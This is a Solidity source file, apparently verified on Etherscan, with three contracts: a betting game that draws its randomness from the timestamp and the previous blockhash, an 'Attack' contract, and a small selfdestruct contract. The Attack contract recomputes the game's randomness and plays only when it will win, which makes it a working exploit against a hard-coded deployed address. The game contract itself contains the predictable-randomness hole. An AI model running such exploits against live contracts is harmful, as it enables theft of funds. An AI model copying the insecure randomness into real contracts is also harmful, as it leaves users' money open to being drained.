/**
 *Submitted for verification at Etherscan.io on 2021-06-22
*/

pragma solidity ^0.4.24;

contract game{
    event win(address);
    
    function get_random() public view returns(uint){
        bytes32 random = keccak256(abi.encodePacked(now,blockhash(block.number-1)));
        return uint(random) % 1000;
    }
    function play() public payable {
        require(msg.value == 0.01 ether);
        if(get_random()>=500){
            msg.sender.transfer(0.02 ether);
            emit win(msg.sender);
        }
    }
    
    function () public payable{
        require(msg.value == 1 ether);
    }
    
    constructor () public payable{
        require(msg.value == 1 ether);
    }
}

contract Attack{
    address public attacked = 0xa86A9E49217D9fB216fAB49529F1eBc52792DeF1;
    
    game gamecontract = game(attacked);
    
    function get_random() public view returns(uint){
                bytes32 random = keccak256(abi.encodePacked(now,blockhash(block.number-1)));
        return uint(random) % 1000;
    }
    function attack() public payable {
        require(get_random()>=500);
        gamecontract.play.value(0.01 ether)();
    }
    
    function () public payable{
        
    }
    
    constructor () public payable{
        require(msg.value == 1 ether);
    }
}

contract killdestruct{
    address owner;
    constructor() payable{
        owner = 0xfAC164Ed40dABBE81f82B6eDa73f372DB8CCca94;
    }
    
    function querybalance() public view returns(uint){
        return address(this).balance;
    }
    function killcontract() public{
        require(msg.sender == owner);
        selfdestruct(0x189b76D349054CCca252A58c538BE175C7A6f948);
    }
}